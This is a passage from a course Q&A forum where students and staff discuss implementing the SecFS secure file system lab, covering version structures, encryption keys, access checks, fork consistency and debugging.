<p>user B accesses file X, but only file Y is in the latest VS</p></div>
<h3>Followup Response</h3>
<div>The VSes contain ihandles for every principle; user A’s ihandles can be used to look up user A’s itable, which will contain entries for both file X and file Y. There’s a great diagram in the paper that shows the difference between ihandles, itables, inodes, etc. The VS basically takes a snapshot of a principal’s ihandles, so when you reconstruct the filesystem from the VSL, you can take the most recent version (highest version number) of everybody’s ihandles in order to reconstruct everybody’s itables </div>
<h3>Followup Response</h3>
<div>principal*</div><hr><h1>How does partial credit work for lab 5?</h1>
<h3>2018-05-08T21:13:32Z</h3>
<div><p>Is it by number of test cases we pass or something? If we can&#39;t pass all the tests, how much partial credit do we get?</p></div><hr><h1>do we bump version numbers for VSLs on fetches as well as modifies?</h1>
<h3>2018-05-08T20:48:13Z</h3>
<div><p>pre and post don&#39;t tell us what type of operation it is</p>
<p></p>
<p>how do we know whether to increment the VSL version number</p></div>
<h2>Staff Answer</h2>
<div><p>You should only need to bump the version number if there is a change. Which method will be called when there is a modification?</p></div>
<h2>Followup</h2>
<div><p>modmap?</p></div>
<h3>Followup Response</h3>
<div><p>It seems like we need to keep track of a lot of global state...</p></div>
<h3>Followup Response</h3>
<div><p>hmm, why a lot of global state?</p></div><hr><h1>Does secfs-fuse and fs.py contain syscall names or file operation names?</h1>
<h3>2018-05-08T20:32:30Z</h3>
<div><p>In particular, if we do the improvment for rm and mv, do we</p>
<p></p>
<ul><li>implement unlink and rename</li><li>implement unlink (and just use link &#43; unlink for mv)</li><li>implement rm and mv</li></ul>
<p></p>
<p>in fs.py and secfs-fuse?</p></div>
<h2>Staff Answer</h2>
<div><p>I think rm is using unlink and mv is using rename, so yes, you will have to implement unlink and rename</p></div>
<h2>Followup</h2>
<div><p>Do we also need implement rmdir for that challenge prompt?</p></div>
<h3>Followup Response</h3>
<div><p>bump</p></div>
<h3>Followup Response</h3>
<div><p>I guess</p>
<ul><li>The implementation only supports adding and writing to files, but not deleting or moving them.</li></ul>
<p>implies only <em>files</em>, so only mv and rm is probably fine (since it doesn&#39;t mention directories).</p></div><hr><h1>ServerBehavior for trying to read unauthorized files..</h1>
<h3>2018-05-08T15:47:39Z</h3>
<div><p>Is there a specified behavior the client code we write should have when a client tries to access a file they don&#39;t have the key for or when a version vector is found to be out of line (aka a forking attack happened)?</p>
<p></p>
<p>Right now, i&#39;m just using asserts, so the client code will crash whenever something illegal occurs.</p></div>
<h2>Staff Answer</h2>
<div><p>For accessing a file they don&#39;t have permission to (&#64;635), PermissionError would be fine.</p>
<p>For version vector/consistency check fail, using asserts would be fine, since we can&#39;t recover from that. </p></div><hr><h1>Are late hours counted only when full labs are due or also when partial labs are due?</h1>
<h3>2018-05-08T13:03:37Z</h3>
<div><p>On the submission page, it only counts late hours for when the full lab is due, not when when parts of labs are due (ex. if lab 1a is late, it doesn&#39;t use any late hours, but if lab 1 (full)  is late, it uses late hours).</p>
<p></p>
<p>Is this expected behavior? Should the subparts being late use late hours as well or does only the full lab being late use late hours?</p></div>
<h2>Staff Answer</h2>
<div><p>Yes only late hours on the full lab due date count :)</p></div><hr><h1>PermissionError on unauthorized read</h1>
<h3>2018-05-08T03:45:19Z</h3>
<div><p>As mentioned in &#64;635, I decided it would make sense to raise a PermissionError when a user tries to read an encrypted file without the proper authorization. But, this is causing my test script to hang:</p>
<p></p>
<pre>[ INFO ]: Entering section Read-only client with root key access.
[ INFO ]: client started; waiting for init
[ INFO ]: client ready; continuing with tests
[ .... ]: test ls -la</pre>
<p>Printing primary-client.err, gives a stack trace pointing to the PermissionError - where am I supposed to catch this and somehow display that the action is unauthorized?</p></div>
<h2>Student Answer</h2>
<div><p>Hanging is suggestive of a server lock not being released somewhere -- the server lock/unlock operations take place in _pre() and _post() methods in bin/secfs-fuse. Try looking through the methods in secfs-fuse to see if you need to capture the PermissionError there and handle the exception if necessary. &#64;675 might be somewhat relevant.</p></div><hr><h1>Is usermap and groupmap keys Principals, or ints?</h1>
<h3>2018-05-08T01:30:36Z</h3>
<div><p></p><pre># usermap contains a map from user ID to their public key according to /.users
usermap = {}
# groupmap contains a map from group ID to the list of members according to /.groups
groupmap = {}</pre>
<p>seems to imply IDs (ints)</p>
<p></p>
<p>but the secfs-fuse file seems to imply Principals.</p></div>
<h2>Staff Answer</h2>
<div><p>Yes. You are right. It is actually a principal and the comment is misleading. To help confirm your assumption in the future, I suggest try print those out and print their types to see their actual types.</p></div>
<h2>Followup</h2>
<div><p>Would I just add print statements and check the log?</p></div>
<h3>Followup Response</h3>
<div><p>You should be able to find your printed statements in &#96;client.log&#96; (at least, unless they&#39;re from the single server script).</p></div>
<h3>Followup Response</h3>
<div><p>yes and server log at server.log</p></div><hr><h1>Throwing PermissionError inside Directory class __init__ causes test cases to hang</h1>
<h3>2018-05-08T01:15:48Z</h3>
<div><p>Raising permission errors inside of the __init__ method in the Directory class (e.g. to prevent reading directories belonging to other users) is causing test.sh to hang after the &#34;Restricted read permissions&#34; section. We also tried raising the PermissionError inside of tree.find_under() and tree.add() -- in both instances, test.sh hung. Any ideas why the test script would hang rather than catch PermissionErrors? Does this mean we cannot raise PermissionErrors inside of the methods in tree.py?</p></div>
<h2>Student Answer</h2>
<div><p>If you look at &#96;secfs-fuse&#96;, you&#39;ll see that while &#96;read&#96;, &#96;mkdir&#96;, etc. catch &#96;PermissionError&#96;, &#96;readdir&#96; does not. There are probably multiple potential solutions, but one might be to add a similar &#96;try&#96;/&#96;except&#96; block to &#96;readdir&#96; (I&#39;m not passing all cases yet myself, though, so I can&#39;t say for sure that this is a good idea).</p></div>
<h2>Followup</h2>
<div><p>Thanks -- this was exactly the solution!</p></div><hr><h1>Wouldn&#39;t the client be able to access all private keys?</h1>
<h3>2018-05-08T01:03:20Z</h3>
<div><p>Since private keys are just stored on the file system?</p>
<p></p>
<p>Are all private keys available in secfs.crypto.keys? Or just the private keys for users that use a given client?</p>
<p></p>
<p>How does one client access the public keys for users from other clients? How do you prevent one client from accessing private keys for users from other clients?</p>
<p></p>
<p>Does the virtualenv create separate virtual FS&#39;s for the different clients so that they can&#39;t access each other&#39;s files? That makes sense to limit private key access, but what about public key? How do you get the public keys of other users?</p></div>
<h2>Student Answer</h2>
<div><p>Nvm, secfs.crypto.keys is private keys.</p>
<p></p>
<p>secfs.fs.usermap is public keys.</p></div><hr><h1>Exercise 1 Mounting Second Client</h1>
<h3>2018-05-08T00:39:33Z</h3>
<div><p>My team has managed to load/store the VSL on the server, but when mounting a second client, we still get a LookupError. </p>
<p></p>
<p>When in the following stages should we expect to not get a LookupError? </p>
<p>- update VSL<br />- load &amp; store VSL</p>
<p>- sign and verify VS<br />- consistency check</p>
<p>- support group table</p></div>
<h2>Staff Answer</h2>
<div><p>If it happens to second mount, bugs in load and store VSL are the most likely causes. <br />However, you will need to check the full error. It seems to me that you already did test manually, right?<br /><br />Does this mean you can&#39;t successfully mount the second client or you can but you cannot see some of these &#39;.&#39;, &#39;..&#39;,  &#39;.group&#39;, and &#39;.users&#39; in mnt2?</p></div>
<h2>Followup</h2>
<div><p>No, we can&#39;t successfully mount the second client -&gt; when we do that, we get the same LookupError as usual: </p>
<p></p>
<pre>LookupError: asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist</pre>
<p></p></div>
<h3>Followup Response</h3>
<div><p>That can come from your bugs in load and store VSL step. Try print out all the I you currently have at that moment because it can&#39;t found your I( uid = 0, 0 ). Start from making sure store work as you expect. Try print along the step and continue to check the load. Adding assertion or throwing an exception on additional constraint is also a good way to make sure your implementation work properly. </p></div>
<h3>Followup Response</h3>
<div><p>We printed out our current VSL in each of the pre, post, and modmap functions, and the client.log gave:<br /><br /></p>
<pre>httpd&#64;vm-6858:~/secfs$ cat client.log 
ready
no root for / established; creating...
pre before
{}
pre after
{}
in mod
{}
no current list for principal &lt;uid=0&gt; ; creating empty table {}
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1e2c&gt;}
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1eac&gt;}
CREATED ROOT AT 6b02b5b3094fa1195f1cc4c055f6bacb37a1c8deda59aa967f98c880
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1eec&gt;}
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f73ac&gt;}
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1eec&gt;}
in mod
{0: &lt;secfs.tables.VersionStructure object at 0xb65f760c&gt;}
post
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1eec&gt;}
root is at (&lt;uid=0&gt;, 0)
pre before
{0: &lt;secfs.tables.VersionStructure object at 0xb65f1eec&gt;}
pre after
{0: &lt;secfs.tables.VersionStructure object at 0xb65f7c4c&gt;}</pre>
<p></p>
<p>So it seems like we do have something for uid=0, right? But we still get the lookup error.</p></div>
<h3>Followup Response</h3>
<div><p>When mounting the second client, our client.log shows this:</p>
<p></p>
<pre>ready
root is at ((0, False), 0)
current itables in resolve: {}
get_inode ihash: None</pre>
<p>In our tables.pre(), we are:</p>
<ol><li>getting the server&#39;s VSL (which is initialized to having a user with uid=0)</li><li>updating our current_itables according to what is in the server&#39;s VSL so that any functions such as resolve() and modmap() have the updated itables</li></ol>
<p></p>
<p>But this log seems to suggest that when a second client is mounted, pre() is not called before resolve()... why is this??</p></div>
<h3>Followup Response</h3>
<div><p>Solved: refresh() was called before getting VSL, so user and group files were being modified without the VSL</p></div><hr><h1>&#39;ls&#39; command after mounting second client can&#39;t be cancelled</h1>
<h3>2018-05-08T00:38:01Z</h3>
<div><p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hzmptsseh523b/jgwxzag5u28d/Screen_Shot_20180507_at_8.32.35_PM.png" alt="" /></p>
<p>Hi,</p>
<p>After trying to mount the second client (ex1), we get this error where no matter what we do we can&#39;t exit out of the command. </p>
<p>What is the cause of this and how can we prevent this?</p></div>
<h2>Staff Answer</h2>
<div><p>Open up new terminal then run </p>
<p></p>
<pre>ps -u httpd</pre>
<p>kill the related processes such as ./secfs-server, ./sftp-server, and ./stop.sh by running</p>
<pre>kill &lt;PID&gt;</pre>
<p>This should fix your problem. Let me know if it doesn&#39;t.</p>
<p></p></div>
<h2>Followup</h2>
<div><p>Thanks! but why do we get this error? </p></div>
<h3>Followup Response</h3>
<div><p>&#64;673</p></div><hr><h1>clients communicating?</h1>
<h3>2018-05-07T23:02:01Z</h3>
<div><p>How do clients communicate with each other? I know we have a global server variable to communicate with server, but how do clients communicate with each other?</p>
<p></p>
<p>This is for the freshness improvement (maybe other things will use it as well).</p></div><hr><h1>Standard FUSE method for moving files?</h1>
<h3>2018-05-07T21:02:39Z</h3>
<div><p>Is there a standard FUSE method for moving files that we can overwrite? I&#39;m looking at the list of operations <a href="http://www.rath.org/llfuse-docs/operations.html" target="_blank">here</a> and I&#39;m not seeing anything. Otherwise I&#39;m not sure how to add the entry point for the client to move a file...Do I just define my own function in the client?</p></div>
<h2>Student Answer</h2>
<div><p><a href="https://www.slideshare.net/matteobertozzi/python-fuse">https://www.slideshare.net/matteobertozzi/python-fuse</a></p>
<p></p>
<p>slides 20 -&gt; 30 </p></div><hr><h1>VM Crashing</h1>
<h3>2018-05-07T19:35:02Z</h3>
<div><p>My VM keeps crashing. Ssh fails to connect. Sshfs connections are broken. The VM doesn&#39;t publish an IP that I can connect to when I run /sbin/ifconfig/etho0. Anyone have and resolve this issue?</p>
<p></p>
<p>Running on MacOSX.</p></div>
<h2>Staff Answer</h2>
<div><p>Make sure that vm is only the single vm you currently running. <br />Try shutdown all vm, restart your laptop, and start the vm again. <br />To shutdown the vm in VMware, select &#34;virtual machine &gt; power off&#34;. <br /><br />This issue typically shows up when you open multiple vm or have some instance/device that might tried to use the internet connection from your laptop. </p></div><hr><h1>Lab5 Ex3 root access to group-readable files</h1>
<h3>2018-05-07T18:14:47Z</h3>
<div><p>There&#39;s no mechanism for adding users to groups right now in SecFS, but if there were one, I&#39;d imagine that the &#96;root&#96; user controls adding users to groups, so they could put themselves in any group that they want and thus read any group-readable file. Is it acceptable if &#96;root&#96; has access to symmetric decryption keys for all groups?</p></div>
<h2>Staff Answer</h2>
<div><p>I think that sounds reasonable to me, you could draw an analogy to the privileged root user in a filesystem having read/write access to any files. What you could also do is in your write-up portion for improvement, briefly mention why you think it is ok / what are the possible security problems if you choose this.</p></div><hr><h1>Lab5 Add user to group</h1>
<h3>2018-05-07T12:01:25Z</h3>
<div><p>Is there any function in, e.g., &#96;secfs-fuse&#96; which is called when a user is added to a group? I&#39;m wondering if there&#39;s a way that I can run some Python code on addition/removal of users from groups.</p></div>
<h2>Staff Answer</h2>
<div><p>The place where the users and groups are initialized with a new share in bin/secfs-fuse: </p>
<p></p>
<pre># initialize a new share, and tell the server about it. don&#39;t<br /># refresh the user and group maps, as they have not yet been built.<br />self._pre(mounter, False)<br />root = secfs.fs.init(mounter,<br />{u: secfs.crypto.generate_key(u) for u in secfs.crypto.keys},<br />{Group(100): [u for u in secfs.crypto.keys if u.id != 666]}<br />)<br />self.server.create(self.share, root)<br />self._post()</pre>
<p></p>
<p>And init() in fs.py will create the .users and .groups files </p>
<p></p>
<p>In the skeleton that we give you, there currently isn&#39;t a way to dynamically add / remove users. If you are doing the improvement for user revocation or if your improvement needs that feature, I think you will have to add it in. </p>
<p></p>
<p></p></div>
<h2>Followup</h2>
<div><p>Thanks - any tips on, if we wanted to add functionality for adding/removing users and groups, how we would do that? We have &#96;usermap&#96; and &#96;groupmap&#96; in &#96;secfs.fs&#96;, but I&#39;m not sure how I&#39;d run a command (in the shell) to add a user to a group and have that update in Python-land. Is there anything in the FUSE library that we&#39;re using that would help with this? Or should I just write Python script - e.g. &#96;create_group&#96;, &#96;add_user_to_group&#96;, and &#96;remove_user_from_group&#96; - which will make the necessary changes when called instead of trying to &#34;override&#34; usual bash commands for adding users to groups?</p></div>
<h3>Followup Response</h3>
<div><p>I&#39;m not sure if there is anything in the FUSE library that can help, but having a Python script that loads and modifies the .groups (as root) with the methods you mentions sounds good to me. </p></div><hr><h1>Lab5 Ex3 - is existing file read protected</h1>
<h3>2018-05-07T11:59:34Z</h3>
<div><p>I see where &#96;umask&#96; is used to determine whether we should read-protect a new file when we&#39;re creating it, but how do we determine the level of read protection (user, group, or world) on an existing file? I see that &#96;secfs-fuse._get_attr&#96; has a section about whether a file is encrypted, but I&#39;m not sure, given an &#96;i&#96;, how I would check which read protection level it has.</p></div>
<h2>Staff Answer</h2>
<div><p>Yes, you on the right track. When a user creates a file, they could use umask &#39;0004&#39; to make it not world-readable. Then it depends on who the owner is (is it the user or the group?). What can you tell about the file if it is world-readable? How can you distinguish the other cases? </p></div><hr><h1>python 2 or 3?</h1>
<h3>2018-05-07T03:10:33Z</h3>
<div><p>does lab 5 use python 2 or python 3?</p></div>
<h2>Followup</h2>
<div><p>all the code says python3, but in python2 the modules don&#39;t even load, because pip installs them under python2</p></div>
<h2>Staff Answer</h2>
<div><p>Python3. I don&#39;t think you need to pip install modules to finish this lab, what did you need it for?</p></div>
<h2>Followup</h2>
<div><p>Python3</p>
<p></p>
<pre>&gt;&gt;&gt; from cryptography.hazmat.primitives.asymmetric import rsa
Traceback (most recent call last):
  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
ImportError: No module named &#39;cryptography&#39;</pre>
<p></p>
<p>The crypto module isn&#39;t there</p></div>
<h3>Followup Response</h3>
<div><p>Have you run ./setup.py? That should install the cryptograph module. </p></div>
<h3>Followup Response</h3>
<div><p>I ran ./setup.sh</p>
<p></p>
<p>./setup.py yields</p>
<p></p>
<pre>Traceback (most recent call last):
  File &#34;./setup.py&#34;, line 3, in &lt;module&gt;
    from setuptools import setup
ImportError: No module named &#39;setuptools&#39;</pre>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Are you running in the class VM? </p></div>
<h3>Followup Response</h3>
<div><p>yes</p></div>
<h3>Followup Response</h3>
<div><p>Sorry, I made a mistake, can you run ./setup.sh (instead of ./setup.py)?</p></div>
<h2>Followup</h2>
<div><p>Also are we supposed to test inside the venv (running ./start.sh) or outside?</p>
<p></p>
<p>(Either way,</p>
<ul><li>./setup.py doesn&#39;t work</li><li>python3 -m pip install setuptools doesn&#39;t work</li><li>
<pre>from cryptography.hazmat.primitives.asymmetric import rsa doesn&#39;t work</pre>
</li></ul></div>
<h2>Followup</h2>
<div><p>Also, I think the crypto package does not support Python 3:</p>
<p></p>
<p><strong>Requires: Python &gt;=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*</strong></p></div>
<h3>Followup Response</h3>
<div><p>https://pypi.org/project/cryptography/</p></div>
<h2>Followup</h2>
<div><p>The docs say that &#34;sign&#34; is supposed to be a function (and the open source source code in Github confirms it), but it is not there in my module</p>
<p></p>
<pre>&gt;&gt;&gt; dir(RSAPrivateKey)
[&#39;__abstractmethods__&#39;, &#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__dict__&#39;, &#39;__doc__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__module__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;__weakref__&#39;, &#39;_abc_cache&#39;, &#39;_abc_negative_cache&#39;, &#39;_abc_negative_cache_version&#39;, &#39;_abc_registry&#39;, &#39;decrypt&#39;, &#39;key_size&#39;, &#39;public_key&#39;, &#39;signer&#39;]</pre>
<p></p>
<p>Note that </p>
<pre>sign</pre>
<p>is conspicuously missing.</p></div>
<h3>Followup Response</h3>
<div><p>Try calling dir on an instance of a private key. You can find private keys in &#34;keys&#34; within crypto.py</p></div>
<h2>Followup</h2>
<div><p>Related to this topic, can I install extra modules by changing setup.py?</p></div>
<h3>Followup Response</h3>
<div><p>Is it for the improvements? If it is and you really need the extra modules, I think it should be fine, but you might also want to add a note within your design doc</p></div>
<h3>Followup Response</h3>
<div>No I&#39;m just using some standard datastructure such as sorted dict. Not hard to implement one but I&#39;m not rebuilding this wheel...</div><hr><h1>AttributeError: &#39;_RSAPrivateKey&#39; object has no attribute &#39;sign&#39;</h1>
<h3>2018-05-07T03:05:06Z</h3>
<div><p>My RSA private key can&#39;t sign. Is there something wrong with the module?</p></div>
<h2>Followup</h2>
<div><p>The docs seem to be wrong, or maybe we just have the wrong version? :/</p>
<p></p>
<pre>&gt;&gt;&gt; import cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey
Traceback (most recent call last):
  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
ImportError: No module named RSAPrivateKey</pre>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Try searching for an example of using cryptography.hazmat to sign? Which docs are you looking at?</p></div><hr><h1>Lecture 23 HW</h1>
<h3>2018-05-07T00:07:42Z</h3>
<div><p>Do we need to hand in anything for lecture 23? Asking b/c I see an entry for it in submissions....</p></div>
<h2>Staff Answer</h2>
<div><p>Nope, good catch, removed lecture 23 from the submission web site.</p></div><hr><h1>Generating Symmetric Key</h1>
<h3>2018-05-06T23:50:03Z</h3>
<div><p>I can&#39;t find any built-in functions in the code for lab 5 to generate symmetric keys. Are we supposed to create our own functions to generate symmetric keys or is there something I&#39;m missing?</p></div>
<h2>Followup</h2>
<div><p>Check the file called access.py and you&#39;ll find the function you&#39;re looking for.</p></div>
<h3>Followup Response</h3>
<div><p>access.py doesn&#39;t have anything hto</p>
<p></p>
<p>It&#39;s literally</p>
<p></p>
<pre>import secfs.fs
from secfs.types import I, Principal, User, Group

def can_read(user, i):
    &#34;&#34;&#34;
    Returns True if the given user can read the given i.
    &#34;&#34;&#34;
    return True

def can_write(user, i):
    &#34;&#34;&#34;
    Returns True if the given user can modify the given i.
    &#34;&#34;&#34;
    if not isinstance(user, User):
        raise TypeError(&#34;{} is not a User, is a {}&#34;.format(user, type(user)))

    if not isinstance(i, I):
        raise TypeError(&#34;{} is not an I, is a {}&#34;.format(i, type(i)))

    # If i is owned by a user, and that user isn&#39;t you, you can&#39;t write
    if i.p.is_user() and i.p != user:
        return False

    # If a group owns i, and you aren&#39;t in the group, you can&#39;t write
    if i.p.is_group() and (i.p not in secfs.fs.groupmap or user not in secfs.fs.groupmap[i.p]):
        return False<br />
    return True

def can_execute(user, i):
    &#34;&#34;&#34;
    Returns True if the given user can execute the given i.
    &#34;&#34;&#34;
    if not isinstance(user, User):
        raise TypeError(&#34;{} is not a User, is a {}&#34;.format(user, type(user)))

    if not secfs.access.can_read(user, i):
        return False

    # check x bits
    node = secfs.fs.get_inode(i)
    return node.ex</pre>
<p></p></div>
<h2>Followup</h2>
<div><p>bump</p></div>
<h3>Followup Response</h3>
<div><p>I&#39;m so sorry I was really sleepy when I answered this the first time.  I added a function to crypto ... but did it long enough ago that I thought it was already in the file.  Fernet.generate_key() is precisely the way to go.</p></div><hr><h1>ACL never changes after creation?</h1>
<h3>2018-05-06T21:47:32Z</h3>
<div><p>&gt; We specifically do not require that a user be able to modify who is able to read a file after the fact. This includes if a group changes, and the ACL of the file has technically changed. Furthermore, we do not require that you hide the inode metadata of encrypted files, though you may do so if you wish.</p>
<p></p>
<p>So this means that the ACL can never change after creation right?</p>
<p></p>
<p>So if user A creates a new file owned by group G (with A, B, and C) in it, then later if</p>
<ul><li>user D joins</li><li>user C leaves</li></ul>
<p></p>
<p>it&#39;s still A, B, and C who can access the file right? As in permissions cannot be added or revoked?</p>
<p></p>
<p>Can the permissions be changed at all? I know owners cannot be changed in SUNDR. Can the permission bits be changed with umask after the file creation?</p>
<p></p>
<p>Can a user not in a group (say X, who is not part of group G, containing A, B, C) create a file owned by that group?</p></div>
<h2>Staff Answer</h2>
<div><p>For SecFS without improvements, that is correct. A, B, and C would be able to access the file, and it is not possible to add or revoke permission. You could implement this as an improvement for SecFS. </p>
<p></p>
<p>No, a user not in a group cannot create a file owned by the group. </p></div><hr><h1>Where do we store symmetric keys?</h1>
<h3>2018-05-06T21:44:20Z</h3>
<div><p>Do we store them inside each client, so that the server can&#39;t access them?</p>
<p></p>
<p>Would we use Diffie-Helman key exchange?</p>
<p></p>
<p>Or have the creator of the file generate them and encrypt the key a bunch of times with the public key or any user that can access it and send it to the users?</p>
<p></p>
<p>Since we can&#39;t send anything to other clients, would we just store the symmetric key (multiple copies, encrypted with different public keys) on the server alongside the files?</p></div>
<h2>Staff Answer</h2>
<div><p>This is also a design choice (apologies if this is repetitive) because there are different ways that you can do this, and you *should* explain where you choose to store the symmetric keys. You&#39;ve mentioned some of these points, ultimately, for what you choose for how and where to store the symmetric key, you should be able to explain why only the valid users can access the unencrypted symmetric key. This means the server shouldn&#39;t be able to use/get the unencrypted symmetric key and other users using the same client shouldn&#39;t be able to see/use the key either. </p></div>
<h2>Followup</h2>
<div><p>I&#39;m a little confused by this wording--we should be generating a new symmetric key for each inode, right? So we&#39;d have (# inodes)*(# of allowed users) total encrypted symmetric keys generated?</p></div>
<h3>Followup Response</h3>
<div><p>Yes, you&#39;re right. I&#39;m sorry about my wording above, it should be multiple symmetric_keys. </p></div><hr><h1>Ex 3 ACL?</h1>
<h3>2018-05-06T21:35:52Z</h3>
<div><p>What does &#34;In particular, if a user specifies that a file is read-protected, its contents should be hidden from the server, as well as from any other user not named in the ACL (i.e. that is not the user who created it, or that is not in the group the creator shared the file with)&#34; mean?</p>
<p></p>
<p>Suppose that user U1 created a file owned by group G1.</p>
<p></p>
<p>Does it mean:</p>
<ul><li>Only U1 and G1 can access the file.</li><li>Only G1 can access the file.</li></ul>
<p></p>
<p>Is the ACL the user &#43; group, or only user <em>xor</em> group (either but not both), depending on who owns the file?</p></div>
<h2>Staff Answer</h2>
<div><p>The ACL for the file should be U1 &#43; G1</p></div>
<h2>Followup</h2>
<div><p>But U1 can only create a file owned by G1 if U1 is contained in G1 right?</p></div>
<h3>Followup Response</h3>
<div><p>For Secfs, yes, only if U1 is part of G1 can U1 create a file for G1</p></div><hr><h1>Umask?</h1>
<h3>2018-05-06T21:20:21Z</h3>
<div><p>Why do we need to <em>abuse</em> umask? Why is chmod unusable? Why would it be <em>abusing</em> umask instead of <em>using</em> umask?</p>
<p></p>
<p>Are all possible settings of the 9 permission bits possible (SUNDR has no 10th sticky bit)? For example</p>
<p></p>
<ul><li>there is no execute functionality (I think)</li><li>can a file be writable but not readable? (that doesn&#39;t seem to make sense for an untrusted server, the server can&#39;t write to an encrypted file it can&#39;t decrypt, and neither can the client)</li></ul></div>
<h2>Student Answer</h2>
<div><p>&#64;638 answers one of your questions.</p></div><hr><h1>Are all the improvements worth the same points?</h1>
<h3>2018-05-06T21:01:48Z</h3>
<div><p>Or will points be awarded based on how difficult the problem was, how creative the solution was, etc.?</p></div>
<h2>Staff Answer</h2>
<div><p>You only need to implement one of the improvements and remember to explain it in your write up. A reasonable, working implementation (e.g. an implementation that still preserves the security properties of secfs) will get full credit. An exceptional/cool implementation or if the improvement is relatively hard, could get extra credit. </p></div><hr><h1>can we create new files?</h1>
<h3>2018-05-06T20:45:48Z</h3>
<div><p>as in if we add a new Python file to one of the directories, will it still compile and link correctly?</p></div>
<h2>Staff Answer</h2>
<div><p>Yes, for example, if you wanted to create your VSL class in some file called vsl.py in the secfs/ directory, then you would add a line </p>
<p></p>
<pre>import secfs.vsl</pre>
<p></p>
<p>at the top of the file that you want to use it in.</p></div><hr><h1>Can a single client be used by multiple users?</h1>
<h3>2018-05-06T20:37:43Z</h3>
<div><p></p></div>
<h2>Staff Answer</h2>
<div><p>Yes, the tests do try to interact as multiple users using a single client.</p></div><hr><h1>Can clients die?</h1>
<h3>2018-05-06T20:37:19Z</h3>
<div><p>If clients can die, then they lose all of their state. How do they verify that the server didn&#39;t roll back the state of the file system then? Since they no longer have whatever state they store to make sure the server didn&#39;t roll back anything.</p></div>
<h2>Staff Answer</h2>
<div><p>Making sure that the server didn&#39;t roll back the state of the file system isn&#39;t a requirement of the basic SecFS system and isn&#39;t guaranteed by it. This is related to the freshness guarantees (one of the improvements). To be able to protect against that, one thing you might do is design a system where you can also talk to other clients so that you do not need to solely rely on a malicious server. </p></div><hr><h1>Does client need to store any VS&#39;s?</h1>
<h3>2018-05-06T19:52:32Z</h3>
<div><p>Do clients need to store the VS of their user (to make sure that the server doesn&#39;t try to reverse time and undo operations that have already been done by reverting to a VSL in the past)?</p>
<p></p>
<p>If not, how do clients prevent time reversal attacks, where the server reverts the VSL to a valid signed VSL from a time in the past where the user hasn&#39;t done some particular operation?</p>
<p></p>
<p>For example, if user U does a modify at time t1, the server can at time t2 revert the VSL to time t0, before the modify at time t1. This isn&#39;t even forking, since it undoes operations that the user itself (not other users) did.</p></div>
<h2>Staff Answer</h2>
<div><p>This is a design choice that you would have to make, but your reasoning sounds good to me :)</p></div><hr><h1>Clarification about freshness guarantees</h1>
<h3>2018-05-05T21:48:05Z</h3>
<div><p>The &#34;Ideas for Improvements&#34; section says:</p>
<p></p>
<p>&gt; As a challenge, you may want to think about providing freshness guarantees: that is, that a client should always see the latest version of a file, or at least that a client should never see an older version of a file after it sees a newer one. SUNDR provides a strong fork consistency guarantee, which might be too ambitious to implement for this lab, but you can choose to implement some limited freshness guarantees if you believe you have a sound design.</p>
<p></p>
<p>I was under the impression that fork consistency was already a requirement for this lab (e.g. there is a test called &#34;can&#39;t trick client into accepting old changes&#34;). Are there behaviors that are allowed for this lab which don&#39;t satisfy fork consistency?</p>
<p></p>
<p>I thought I&#39;d implemented serialized SUNDR with strong fork consistency, but the fact that this is described as &#34;too ambitious to implement for this lab&#34; makes me suspect that I&#39;m missing something. </p></div>
<h2>Followup</h2>
<div><p>Does storing the VS in the client solve this problem?</p></div>
<h3>Followup Response</h3>
<div><p>For the same session, I think it would, but when the session changes, how do you get the initial VS? </p></div>
<h3>Followup Response</h3>
<div><p>Do you mean when the user jumps between different clients?</p>
<p></p>
<p>Even if we don&#39;t guarantee freshness, how do we keep track of anything across multiple clients (while protecting against server time-reversal attacks)?</p></div>
<h2>Staff Answer</h2>
<div><p>Here are some examples that might help: <br /><br /></p>
<p>1. The server is malicious and sends you a stale (i.e., truncated) version of the VSL. Now you won&#39;t see any edits that I make.</p>
<p></p>
<p>2. If the session changes, could the server present an old VSL to on the client&#39;s first request? How can you prevent this?</p></div>
<h2>Followup</h2>
<div><p>Aren&#39;t these examples also allowed under fork consistency? Section 3.2 of the paper describes how a server could effectively show two independent views of a filesystem to two SUNDR clients to prevent them from seeing each others&#39; changes.</p></div>
<h3>Followup Response</h3>
<div><p>I see, the text might be oddly phrased. The lab does provide fork consistency, but it doesn&#39;t provide freshness guarantees. I think the focus of this improvement is more on what the first sentence is saying to always see the latest version of a file / never see something older than what it has already seen. I&#39;ll clarify the &#34;strong fork consistency guarantee&#34;, and get back to you on that. </p></div><hr><h1>Read permissions for user owned file</h1>
<h3>2018-05-05T00:23:46Z</h3>
<div><p>I&#39;m working on exercise 3.  Who should be able to read a user owned file?</p>
<p></p>
<p>If the owner is a group, I check to see if the user is a part of the group and, if they are, I allow them to read the file - that doesn&#39;t seem to break anything.  However, if the owner is a user I checked if the user is the same as the owner ... and that causes me to fail more test cases than I started with, so I&#39;m wondering how we&#39;re supposed to know which users can access which other user&#39;s files.</p></div>
<h2>Staff Answer</h2>
<div><p>Only the user should be able to read the user owned file. What the test cases that are failing when you check that the user is the same as the owner? </p></div><hr><h1>Forming Groups</h1>
<h3>2018-05-04T23:35:33Z</h3>
<div><p>Can we still form groups now? The thing on the submission website for the group repository seem to disallow that now. Thanks</p></div>
<h2>Student Answer</h2>
<div><p>The project page says to email the instructors if the form submission has already closed.</p>
<p></p>
